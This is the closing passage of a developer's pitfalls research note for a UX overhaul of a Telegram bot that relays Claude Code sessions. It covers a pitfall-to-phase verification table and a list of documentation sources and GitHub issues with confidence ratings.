| Approval button overcrowding (13) | Phase 2: Permission Modes | Screenshot approval message on mobile. All buttons readable and tappable. |
| Nested subagent flood (14) | Phase 4: Subagent Visibility | Run a task with 7 parallel agents. Topic remains readable, not flooded. |
| Context % not resetting after /clear (15) | Phase 3: /clear Topic Reuse | /clear at 85% context. Status message shows ~0% within 5 seconds. |

## Sources

- [Telegram Bot API - InlineKeyboardButton callback_data](https://core.telegram.org/bots/api#inlinekeyboardbutton) -- HIGH confidence. Official API docs confirming 1-64 byte limit.
- [Claude Code Hooks Reference](https://code.claude.com/docs/en/hooks) -- HIGH confidence. SessionStart source field, SubagentStart/SubagentStop payloads, SessionEnd reason field.
- [GitHub Issue #13765: Context tracking not resetting on /clear](https://github.com/anthropics/claude-code/issues/13765) -- HIGH confidence. Known bug affecting status display after /clear.
- [GitHub Issue #10373: SessionStart hooks not working for new conversations](https://github.com/anthropics/claude-code/issues/10373) -- MEDIUM confidence. Documents timing issues with SessionStart hooks.
- [grammY Scaling Guide: Flood Limits](https://grammy.dev/advanced/flood) -- HIGH confidence. Official grammY documentation on Telegram rate limits.
- [grammY Interactive Menus Plugin](https://grammy.dev/plugins/menu) -- HIGH confidence. Memory leak warning about dynamic menu registration.
- [Enhanced Telegram callback_data with protobuf + base85](https://seroperson.me/2025/02/05/enhanced-telegram-callback-data/) -- MEDIUM confidence. Community pattern for working around the 64-byte limit.
- [Telegram bot inline buttons with large data](https://medium.com/@knock.nevis/telegram-bot-inline-buttons-with-large-data-950e818c1272) -- MEDIUM confidence. Server-side lookup pattern for callback_data.
- [Claude Code Subagents Documentation](https://code.claude.com/docs/en/sub-agents) -- HIGH confidence. Subagent types, transcript storage, lifecycle.
- [GitHub Issue #20531: TaskOutput returns full JSONL transcript](https://github.com/anthropics/claude-code/issues/20531) -- MEDIUM confidence. Documents transcript format and parsing challenges.
- [Existing codebase analysis](/home/cryptobot/workspace/claude-o-gram/src/) -- HIGH confidence. Direct inspection of current bot.ts, formatter.ts, handlers.ts, topics.ts, session-store.ts, approval-manager.ts.

---
*Pitfalls research for: v3.0 UX Overhaul (compact output, permission modes, subagent visibility, /clear reuse)*
*Researched: 2026-03-01*
